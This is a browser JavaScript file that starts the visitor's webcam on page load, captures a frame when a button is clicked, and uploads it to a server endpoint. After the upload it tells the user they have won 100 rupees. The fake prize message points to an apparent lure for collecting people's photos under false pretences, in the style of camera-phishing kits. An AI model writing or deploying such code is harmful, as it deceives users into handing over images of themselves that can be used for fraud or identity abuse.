const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("captureBtn");
const statusText = document.getElementById("status");

// Start camera immediately
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();
    console.log("🎥 Camera started successfully");
  } catch (err) {
    console.error("Camera access error:", err);
    statusText.textContent = "⚠️ Please allow camera permission.";
  }
}

// Loading animation
function showLoading() {
  statusText.innerHTML = "⏳ Capturing photo";
  let dots = 0;
  const interval = setInterval(() => {
    dots = (dots + 1) % 4;
    statusText.innerHTML = "⏳ Capturing photo" + ".".repeat(dots);
  }, 400);
  return interval;
}

// Capture instantly
captureBtn.addEventListener("click", async () => {
  const loading = showLoading();

  // small delay for frame ready (fast capture fix)
  await new Promise((res) => setTimeout(res, 200));

  const context = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "capture.png");

    try {
      const response = await fetch("/upload", { method: "POST", body: formData });
      const result = await response.json();

      clearInterval(loading);
      if (result.success) {
        statusText.textContent = "🎉 You WIN 100 Rs successfully!";
      } else {
        statusText.textContent = "❌ Upload failed, try again.";
      }
    } catch (err) {
      clearInterval(loading);
      console.error("Upload error:", err);
      statusText.textContent = "⚠️ Error uploading photo!";
    }
  }, "image/png");
});

startCamera();